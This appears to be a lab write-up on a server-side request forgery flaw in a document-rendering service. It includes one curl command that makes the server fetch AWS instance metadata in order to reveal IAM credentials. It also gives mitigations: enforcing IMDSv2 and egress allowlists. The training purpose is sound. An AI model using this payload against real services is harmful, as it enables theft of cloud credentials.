## Attack Surface Analysis

Server-Side Request Forgery (SSRF) vulnerabilities occur when a web application accepts a user-supplied URI without robust protocol and network range filtering.

{% lab target="Vulnerable Document Renderer" difficulty="medium" objective="Extract temporary IAM role credentials from the AWS Instance Metadata Service (IMDSv1)." /%}

### Vulnerability Mechanics

The target application parses remote PDF templates by issuing unvalidated HTTP GET requests:

{% terminal title="exploit.sh" commands=[{"cmd":"curl -s -X POST https://lab.local/render -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'","output":"app-execution-role"}] /%}

{% finding text="The service allowed unauthenticated queries to link-local address 169.254.169.254 due to absence of network egress controls and lack of IMDSv2 token enforcement." /%}

### Mitigation

Enforce IMDSv2 across all EC2 workloads to require session-oriented authentication headers:

{% mitigation text="Require IMDSv2 (HttpTokens=required) and configure application-level egress firewalls or URL allowlists that explicitly block private IP CIDRs." /%}
